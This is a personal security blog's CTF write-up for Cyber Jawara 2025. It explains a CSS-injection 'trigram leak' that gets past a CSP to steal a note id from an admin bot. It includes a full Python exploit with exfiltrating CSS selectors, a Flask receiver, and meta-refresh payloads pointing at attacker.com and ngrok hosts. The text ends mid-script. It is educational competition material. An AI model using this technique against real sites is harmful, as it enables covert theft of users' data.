@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Cyber Jawara CTF 2025 Writeup | Tanknight</title>
+  <meta name="keywords" content=" css-injection , idor , xss , csp-bypass , prototype-pollution , iframe-sandbox-bypass , dom-clobeering , dompurify-bypass ">
+  <meta name="description" content="Cyber Jawara CTF 2025 Writeup | Tanknight">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="A personal blog by Tanknight documenting bug bounty hunting, penetration testing, CTF writeups, vulnerability research, web application security, and technical knowledge sharing.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Tags">
+<meta property="og:url" content="http://tanknight.blog/tags/index.html">
+<meta property="og:site_name" content="Tanknight">
+<meta property="og:description" content="A personal blog by Tanknight documenting bug bounty hunting, penetration testing, CTF writeups, vulnerability research, web application security, and technical knowledge sharing.">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-07-13T13:35:54.000Z">
+<meta property="article:modified_time" content="2026-07-13T13:36:11.689Z">
+<meta property="article:author" content="Tanknight">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="bug bounty">
+<meta property="article:tag" content="bug bounty hunting">
+<meta property="article:tag" content="cybersecurity">
+<meta property="article:tag" content="digital forensics">
+<meta property="article:tag" content="ethical hacking">
+<meta property="article:tag" content="exploit development">
+<meta property="article:tag" content="knowledge sharing">
+<meta property="article:tag" content="penetration testing">
+<meta property="article:tag" content="programming">
+<meta property="article:tag" content="reverse engineering">
+<meta property="article:tag" content="vulnerability disclosure">
+<meta property="article:tag" content="vulnerability research">
+<meta property="article:tag" content="web security">
+<meta property="article:tag" content="writeups">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 8.1.2">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Tanknight" type="application/atom+xml">
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Tanknight</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/TanKnight7"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+            <a title="linkedin"
+               href="https://www.linkedin.com/in/michael-stevanus-tanoto/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-linkedin"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+        </div>
+    </li>
+    
+        
+            
+                
+    <li>
+        <div data-rel="bugbounties">
+            
+            bugbounties
+            
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="certifications">
+            
+            certifications
+            
+        </div>
+        
+    </li>
+
+            
+        
+    
+        
+            
+                
+    <li>
+        <div data-rel="writeups">
+            
+            writeups
+            
+        </div>
+        
+    </li>
+
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="7">
+<input type="hidden" id="yelog_site_word_count" value="11.6k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>arbitrary-file-read</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>command-injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>csp-bypass</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>css-injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>dom-clobeering</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>dompurify-bypass</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>file-upload</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>idor</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>iframe-sandbox-bypass</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>mass-assignment</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nginx-misconfig</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>parser-discrepancies</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>path-traversal</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>prototype-pollution</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sandbox-escape</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>wordpress</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All writeups "
+           href="/2026/07/16/Cyber-Jawara-CTF-2025-Writeup/"
+           data-tag="css-injection,idor,xss,csp-bypass,prototype-pollution,iframe-sandbox-bypass,dom-clobeering,dompurify-bypass"
+           data-author="" >
+            <span class="post-title" title="Cyber Jawara CTF 2025 Writeup">Cyber Jawara CTF 2025 Writeup</span>
+            <span class="post-date" title="2026-07-16 06:51:19">2026/07/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2026/07/15/How-Cybersecurity-Changed-My-Life/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="How Cybersecurity Changed My Life">How Cybersecurity Changed My Life</span>
+            <span class="post-date" title="2026-07-15 12:02:02">2026/07/15</span>
+        </a>
+        
+        
+        <a  class="All writeups "
+           href="/2026/07/14/SCHEMATICSCTF-2025-Writeup/"
+           data-tag="command-injection,sandbox-escape,wordpress"
+           data-author="" >
+            <span class="post-title" title="SCHEMATICS CTF 2025 Writeup">SCHEMATICS CTF 2025 Writeup</span>
+            <span class="post-date" title="2026-07-14 22:07:50">2026/07/14</span>
+        </a>
+        
+        
+        <a  class="All certifications "
+           href="/2026/07/14/How-I-Passed-the-OSWE-Exam-in-Under-2-Months/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="How I Passed the OSWE Exam in Under 2 Months">How I Passed the OSWE Exam in Under 2 Months</span>
+            <span class="post-date" title="2026-07-14 19:12:05">2026/07/14</span>
+        </a>
+        
+        
+        <a  class="All bugbounties "
+           href="/2026/07/14/How-I-Got-Three-Nasa-Certificates-Article/"
+           data-tag="xss"
+           data-author="" >
+            <span class="post-title" title="How I Discovered Three Reflected XSS Vulnerabilities and Earned a Spot in NASA’s Hall of Fame">How I Discovered Three Reflected XSS Vulnerabilities and Earned a Spot in NASA’s Hall of Fame</span>
+            <span class="post-date" title="2026-07-14 03:57:33">2026/07/14</span>
+        </a>
+        
+        
+        <a  class="All writeups "
+           href="/2026/07/14/ACECTF-2025-Writeup/"
+           data-tag="xss,file-upload,ssrf,arbitrary-file-read"
+           data-author="" >
+            <span class="post-title" title="ACE CTF 2025 Writeup">ACE CTF 2025 Writeup</span>
+            <span class="post-date" title="2026-07-14 02:30:53">2026/07/14</span>
+        </a>
+        
+        
+        <a  class="All writeups "
+           href="/2026/07/13/IFEST-2025-CTF-Writeup/"
+           data-tag="ssrf,mass-assignment,nginx-misconfig,ssti,command-injection,parser-discrepancies,path-traversal"
+           data-author="" >
+            <span class="post-title" title="IFEST CTF 2025 Writeup">IFEST CTF 2025 Writeup</span>
+            <span class="post-date" title="2026-07-13 22:01:00">2026/07/13</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-Cyber-Jawara-CTF-2025-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Cyber Jawara CTF 2025 Writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="writeups">writeups</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">css-injection</a>
+            
+            <a class="color5">idor</a>
+            
+            <a class="color4">xss</a>
+            
+            <a class="color1">csp-bypass</a>
+            
+            <a class="color5">prototype-pollution</a>
+            
+            <a class="color2">iframe-sandbox-bypass</a>
+            
+            <a class="color5">dom-clobeering</a>
+            
+            <a class="color2">dompurify-bypass</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2026-07-16 06:48:55'>2026-07-16 06:51</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Insanity-check"><span class="toc-text">Insanity-check</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Trigram-CSS-Leaks-Work"><span class="toc-text">How Trigram CSS Leaks Work</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Pipeline"><span class="toc-text">Exploit Pipeline</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Not-so-nice-html-viewer"><span class="toc-text">Not-so-nice-html-viewer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Sequence-Blueprint"><span class="toc-text">Exploit Sequence Blueprint</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Insanity-check"><a href="#Insanity-check" class="headerlink" title="Insanity-check"></a>Insanity-check</h1><p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup.png"></p>
+<p>This challenge involves an admin bot that automatically registers an account, logs in, and creates a note containing the flag. After generating the note, the bot visits a URL supplied by the user. However, our input is strictly constrained to URLs matching the following regular expression: <code>^http://note:5000/workspace/display/[0-9a-f]{25}$</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-1.png"></p>
+<p>Examining the source code for the note display endpoint reveals an Insecure Direct Object Reference (IDOR) flaw: anyone can view the contents of any note if they know its specific <code>note id</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-2.png"></p>
+<p>When creating a note, we can inject arbitrary HTML into the content field. While this exposes a potential Cross-Site Scripting (XSS) vector, execution is blocked by a strict Content Security Policy (CSP).</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-3.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-4.png"></p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-5.png"></p>
+<p>The application’s CSP directive is highly restrictive: <code>script-src ‘self’ ‘nonce-XXXXXX’</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-6.png"></p>
+<ul>
+<li><code>'self'</code> implies that JavaScript can only execute if loaded from local resources via tags such as: <code>&lt;script src=’/js/javaskript.js’&gt;&lt;/script&gt;</code>.</li>
+<li><code>'nonce-XXXXX'</code> indicates that inline JavaScript will only run if it carries a matching cryptographic nonce value: <code>&lt;script nonce=’XXX’&gt;alert()&lt;/script&gt;</code>. Therefore, exploiting XSS requires leaking this nonce.</li>
+</ul>
+<p>Because standard XSS is unfeasible due to the CSP, the alternative approach is using CSS Injection. However, rather than targeting the nonce, we can directly leak the target <code>note id</code>.</p>
+<p>On the <code>/workspace/home</code> endpoint, the <code>note id</code> is embedded inside the <code>href</code> attribute of an anchor tag. We can leverage CSS Injection to leak this identifier character by character.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-7.png"></p>
+<p>The main complication is that the bot registers a new account and generates a fresh note every time it handles our request. Consequently, the <code>note id</code> changes dynamically on each interaction.</p>
+<p>Furthermore, the bot only views our URL for a tight window of 5 seconds. Leaking a unique identifier within this constraint using conventional sequential CSS injection is impossible.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-8.png"></p>
+<p>While traditional CSS injection fails here, we can optimize exfiltration speed using a <strong>Trigram CSS Leak</strong> technique. (Reference: <a target="_blank" rel="noopener" href="https://dimasc.tf/notes/cssleak/#3-trigrams-css-leak-using-seperated-css-if-the-server-have-upload-limitation">Dimas’s Trigrams CSS Leak Guide</a>).</p>
+<h2 id="How-Trigram-CSS-Leaks-Work"><a href="#How-Trigram-CSS-Leaks-Work" class="headerlink" title="How Trigram CSS Leaks Work"></a>How Trigram CSS Leaks Work</h2><p>Instead of guessing characters sequentially, we exfiltrate the first two and last two characters of the <code>note id</code>, while simultaneously extracting all possible 3-character substrings (trigrams) present in the token. Although these middle substrings are collected out of order, the solver algorithm can systematically stitch them together to reconstruct the original ID. (A practical example of this reconstruction is included in the automation script below).</p>
+<p>To execute this strategy, we construct four distinct notes:</p>
+<ol>
+<li><strong>Note 1</strong>: Implements a client-side redirect to the attacker’s server via a meta-refresh tag: <code>&lt;meta http-equiv='refresh' content='0; url=http://attacker.com/exploit'&gt;</code>.</li>
+<li><strong>Note 2</strong>: Houses the CSS Injection payload responsible for leaking the starting and ending pairs of characters.</li>
+<li><strong>Note 3</strong>: Houses the first portion of the CSS payload dedicated to extracting the 3-character middle combinations.</li>
+<li><strong>Note 4</strong>: Houses the remaining portion of the middle-character CSS payload.</li>
+</ol>
+<p><em>Note 3 and Note 4 are separated to bypass server-side input character limits.</em></p>
+<p>Looking at the highlighted source code below, we can place our custom CSS payload inside any tag assigned the ID <code>user-theme-styles</code>. The application will automatically save this style data into the browser’s <code>localStorage</code>.</p>
+<p><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-9.png"></p>
+<p>When a user accesses <code>/workspace/home</code>, an internal script retrieves and renders the CSS cached in <code>localStorage</code>.<br><img src="/../images/Cyber-Jawara-CTF-2025-Writeup-10.png"></p>
+<h2 id="Exploit-Pipeline"><a href="#Exploit-Pipeline" class="headerlink" title="Exploit Pipeline"></a>Exploit Pipeline</h2><ul>
+<li><strong>Notes 2, 3, 4</strong>: Inject the CSS inside an element like <code>&lt;i id="user-theme-styles"&gt;CSS PAYLOAD&lt;/i&gt;</code>. We also attach the tag <code>&lt;meta http-equiv='refresh' content='0; url=/workspace/home'&gt;</code> to force immediate redirection to the home page where the <code>note id</code> resides.</li>
+<li>We point the admin bot to <strong>Note 1</strong>. The bot lands on the page, follows the meta-refresh, and connects to our attacker server. The server serves an HTML structure where the <code>{{NOTES}}</code> array placeholder maps out the IDs of our pre-created exploit notes.</li>
+</ul>
+<pre><code class="language-html">&lt;html&gt;
+  &lt;script&gt;
+    const NOTES = {{NOTES}};
+    let sleep = (ms) =&gt; new Promise((resolve) =&gt; setTimeout(resolve, ms));
+    (async () =&gt; {
+      for (let key of Object.entries(NOTES)) {
+        if(key[0] === "redirect"){ // Skip Note 1 to prevent infinite redirection loops
+            continue;
+        }
+        open(key[1])
+        await sleep(400);
+      }
+    })();
+  &lt;/script&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Below is the complete Python script used to automate the registration, payload generation, and Trigram parsing:</p>
+<pre><code class="language-python">import asyncio
+import httpx
+from threading import Thread
+import json
+
+  # === CHANGE ME ===
+URL = "http://ctf.cyberjawara.id:58268" # URL OF THE CHALLENGE WEBSITE.
+PUBLIC_URL = "http://6.tcp.ngrok.io:10731" # HOST THIS EXPLOIT WITH NGROK.
+PORT = 4444 # THE EXPLOIT PORT
+# === CHANGE ME ===
+
+  # TRIGRAM SOLVER
+GSTART = ""
+GEND = ""
+GTRIGRAMS = []
+PREV_TRIGRAMS_LEN = len(GTRIGRAMS)
+TARGET = "http://note:5000/"
+NOTES = {}
+
+def reconstruct_from_start(trigrams, start):
+    """Reconstruct sequence from start until no more trigrams can be used"""
+    used_trigrams = set()
+    sequence = start
+    while True:
+        found_extension = False
+        if len(sequence) &gt;= 2:
+            last_two = sequence[-2:]
+            for trigram in trigrams:
+                if trigram not in used_trigrams and trigram.startswith(last_two):
+                    sequence += trigram[-1]
+                    used_trigrams.add(trigram)
+                    found_extension = True
+                    break
+        if not found_extension:
+            break
+    return sequence, used_trigrams
+
+def reconstruct_from_end(trigrams, end):
+    """Reconstruct sequence from end (backwards) until no more trigrams can be used"""
+    used_trigrams = set()
+    sequence = end
+    while True:
+        found_extension = False
+        if len(sequence) &gt;= 2:
+            first_two = sequence[:2]
+            for trigram in trigrams:
+                if trigram not in used_trigrams and trigram.endswith(first_two):
+                    sequence = trigram[0] + sequence
+                    used_trigrams.add(trigram)
+                    found_extension = True
+                    break
+        if not found_extension:
+            break
+    return sequence, used_trigrams
+
+def construct_middle_part(remaining_trigrams, start_seq, end_seq, target_length):
+    """Try to construct the missing middle part using remaining trigrams"""
+    if not remaining_trigrams:
+        return None
+    current_length = len(start_seq) + len(end_seq)
+    needed_middle_length = target_length - current_length
+    if needed_middle_length &lt;= 0:
+        return None
+    def try_chain_trigrams(trigrams_list, current_sequence="", used=set()):
+        if len(current_sequence) == needed_middle_length:
+            return current_sequence, used
+        if len(current_sequence) &gt; needed_middle_length:
+            return None
+        for trigram in trigrams_list:
+            if trigram in used:
+                continue
+            if not current_sequence:
+                result = try_chain_trigrams(trigrams_list, trigram, used | {trigram})
+                if result:
+                    return result
+            else:
+                if len(current_sequence) &gt;= 2 and trigram.startswith(current_sequence[-2:]):
+                    new_sequence = current_sequence + trigram[-1]
+                    result = try_chain_trigrams(trigrams_list, new_sequence, used | {trigram})
+                    if result:
+                        return result
+        return None
+    return try_chain_trigrams(list(remaining_trigrams))
+
+def advanced_trigram_solver(trigrams, start, end, target_length=16):
+    """
+    Advanced reconstruction strategy:
+    1. Reconstruct from start until no more can be constructed
+    2. Reconstruct from end until no more can be constructed  
+    3. Check if there's missing part between start and end constructs
+    4. If missing, use leftover trigrams to construct the gap
+    5. If constructed gap length matches missing length, that's the answer
+    """
+    trigram_set = set(trigrams)
+    # Step 1: Reconstruct from start
+    start_sequence, start_used = reconstruct_from_start(trigram_set, start)
+    # Step 2: Reconstruct from end
+    remaining_after_start = trigram_set - start_used
+    end_sequence, end_used = reconstruct_from_end(remaining_after_start, end)
+    # Step 3: Check for overlap or gap
+    remaining_trigrams = trigram_set - (start_used | end_used)
+    
+    # Check if sequences overlap
+    if start_sequence.endswith(end_sequence):
+        overlap_len = len(end_sequence)
+        return start_sequence[:-overlap_len] + end_sequence
+    elif end_sequence.startswith(start_sequence):
+        overlap_len = len(start_sequence)
+        return start_sequence + end_sequence[overlap_len:]
+    else:
+        # There's a gap - try to fill it
+        current_total_length = len(start_sequence) + len(end_sequence)
+        missing_length = target_length - current_total_length
+        if missing_length &lt;= 0:
+            combined = start_sequence + end_sequence
+            return combined[:target_length] if len(combined) &gt;= target_length else combined
+        # Step 4: Construct middle part
+        middle_result = construct_middle_part(remaining_trigrams, start_sequence, end_sequence, target_length)
+        if middle_result:
+            middle_part, middle_used = middle_result
+            if len(middle_part) == missing_length:
+                return start_sequence + middle_part + end_sequence
+    # Fallback
+    return start_sequence + end_sequence
+
+class BaseAPI:
+    def __init__(self, url=URL) -&gt; None:
+        self.c = httpx.AsyncClient(base_url=url, verify=False, timeout=10000)
+        self.session = ""
+
+class API(BaseAPI):
+    def register(self, username, email, password):
+        return self.c.post("/identity/signup", data={
+            "username": username,
+            "email": email,
+            "password": password,
+            "confirm_password": password
+        })
+    def login(self, username, password):
+        return self.c.post("/identity/signin", data={
+            "username": username,
+            "password": password
+        })
+    def create_note(self, title, content):
+        return self.c.post("/workspace/compose", data={
+            "title": title,
+            "content": content
+        })
+    def report(self, note_id):
+        return self.c.post(f"/report/", data={
+            "url": note_id
+        })
+
+def create_css_files():
+    import itertools
+    URL = PUBLIC_URL
+
+    TEMPLATE_START = '''a[href^="/workspace/display/%s"]{--a_%s: url(%s?START=%s);}'''
+    TEMPLATE_MATCH = '''a[href*="%s"]{--b_%s: url(%s?MATCH=%s);}'''
+    TEMPLATE_END = ''' a[href$="%s"]{--c_%s: url(%s?END=%s);}'''
+    TEMPLATE_BACKGROUND_SCRIPT = '''a[href^="/workspace/display/"]{background: %s;}'''
+
+    CHARSET = "0123456789abcdef"
+    CSS_DIR = "static/css"
+
+    start_css = ""
+    end_css = ""
+    match_css_1 = ""
+    match_css_2 = ""
+    match_css_3 = ""
+
+    props_start = []
+    props_end = []
+    props_match_1 = []
+    props_match_2 = []
+    props_match_3 = []
+
+    for cs in itertools.product(CHARSET, repeat=2):
+        s = "".join(cs)
+        start_css += TEMPLATE_START % (s, s, URL, s)
+        end_css += TEMPLATE_END % (s, s, URL, s)
+        props_start.append(f"var(--a_{s},none)")
+        props_end.append(f"var(--c_{s},none)")
+
+    for i, cs in enumerate(itertools.product(CHARSET, repeat=3)):
+        s = "".join(cs)
+        if i &lt;= 3500:
+            match_css_1 += TEMPLATE_MATCH % (s, s, URL, s)
+            props_match_1.append(f"var(--b_{s},0)")
+        elif i &lt;= 7000:
+            match_css_2 += TEMPLATE_MATCH % (s, s, URL, s)
+            props_match_2.append(f"var(--b_{s},0)")
+        elif i &lt;= 10500:
+            match_css_3 += TEMPLATE_MATCH % (s, s, URL, s)
+            props_match_3.append(f"var(--b_{s},0)")
+
+    all_css = start_css + end_css
+    all_props = props_start + props_end
+    with open(f'{CSS_DIR}/first.css', 'wt') as fp:
+        fp.write(all_css)
+        fp.write(TEMPLATE_BACKGROUND_SCRIPT % (",".join(all_props)))
+
+    with open(f'{CSS_DIR}/second.css', 'wt') as fp:
+        fp.write(match_css_1)
+        fp.write(TEMPLATE_BACKGROUND_SCRIPT % (",".join(props_match_1)))
+
+    with open(f'{CSS_DIR}/third.css', 'wt') as fp:
+        fp.write(match_css_2)
+        fp.write(TEMPLATE_BACKGROUND_SCRIPT % (",".join(props_match_2)))
+
+    with open(f'{CSS_DIR}/fourth.css', 'wt') as fp:
+        fp.write(match_css_3)
+        fp.write(TEMPLATE_BACKGROUND_SCRIPT % (",".join(props_match_3)))
+
+def webServer():
+    from flask import Flask, request, send_from_directory, jsonify
+    from threading import Thread
+
+    app = Flask(__name__, static_folder='static')
+
+    index = """
+    &lt;html&gt;
+  &lt;script&gt;
+    const NOTES = {{NOTES}};
+    let sleep = (ms) =&gt; new Promise((resolve) =&gt; setTimeout(resolve, ms));
+    (async () =&gt; {
+      for (let key of Object.entries(NOTES)) {
+        if(key[0] === "redirect"){
+            continue;
+        }
+        open(key[1])
+        await sleep(400);
+      }
+    })();
+  &lt;/script&gt;
+&lt;/html&gt;
+    """
+
+    @app.route("/static/&lt;path:filename&gt;")
+    def static_files(filename):
+        return send_from_directory(app.static_folder, filename)
+
+    @app.route("/exploit", methods=["GET"])
+    def exploit():
+        global TARGET, NOTES
+        html = index.replace("{{NOTES}}", json.dumps(NOTES))
+        return html, 200
+
+    @app.route("/", methods=["GET"])
+    def root():
+        global GSTART, GEND, GTRIGRAMS
+        START = request.args.get('START', "")
+        END = request.args.get('END', "")
+        MATCH = request.args.get('MATCH', "")
+
+        if len(START) &gt; 0:
+            GSTART = START
+        elif len(END) &gt; 0:
+            GEND = END
+        elif len(MATCH) &gt; 0:
+            GTRIGRAMS.append(MATCH)
+        print(GSTART, GEND, GTRIGRAMS)
+        return jsonify(message="Hello World")
+
+    return Thread(target=app.run, args=('0.0.0.0', PORT))
+
+async def main():
+    # STEP 1: INITIALIZE ACCOUNT AND ENVIRONMENT
+    api = API()
+    server = webServer()
+    server.start()
+    await api.register("fooman", "fooman@fooman.com", "fooman")
+    await api.login("fooman", "fooman")
+
+    create_css_files()
+    
+    # Establish redirection to our infrastructure via meta-refresh
+    res = await api.create_note("1", f"&lt;meta http-equiv='refresh' content='0; url={PUBLIC_URL}/exploit'&gt;")
+    NOTES["redirect"] = "http://note:5000" + res.headers["Location"]
+    
+    with open("static/css/first.css", "r") as fp:
+        res = await api.create_note("2", f"&lt;meta http-equiv='refresh' content='0; url=/workspace/home'&gt;&lt;i id='user-theme-styles'&gt;{fp.read()}&lt;/i&gt;")
+        print(res.text)
+        NOTES["css1"] = "http://note:5000" + res.headers["Location"]
+        
+    with open("static/css/second.css", "r") as fp:
+        res = await api.create_note("3", f"&lt;meta http-equiv='refresh' content='0; url=/workspace/home'&gt;&lt;i id='user-theme-styles'&gt;{fp.read()}&lt;/i&gt;")
+        print(res.text)
+        NOTES["css2"] = "http://note:5000" + res.headers["Location"]
+        
+    with open("static/css/third.css", "r") as fp:
+        res = await api.create_note("4", f"&lt;meta http-equiv='refresh' content='0; url=/workspace/home'&gt;&lt;i id='user-theme-styles'&gt;{fp.read()}&lt;/i&gt;")
+        print(res.text)
+        NOTES["css3"] = "http://note:5000" + res.headers["Location"]
+        
+    with open("static/css/fourth.css", "r") as fp:
+        res = await api.create_note("5", f"&lt;meta http-equiv='refresh' content='0; url=/workspace/home'&gt;&lt;i id='user-theme-styles'&gt;{fp.read()}&lt;/i&gt;")
+        print(res.text)
+        NOTES["css4"] = "http://note:5000" + res.headers["Location"]
+
+    await api.report(NOTES["redirect"])
+    print(NOTES)
+    
+    while True:
+        await asyncio.sleep(1)
+        result = advanced_trigram_solver(GTRIGRAMS, start=GSTART, end=GEND, target_length=25)
+        if result:
+            print("Successfully extracted identifier: ", result)
+            res = await api.c.get("/workspace/display/"+result)
+            print(res.text)
+            break
+
+    server.join()
+
+if __name__ == "__main__":
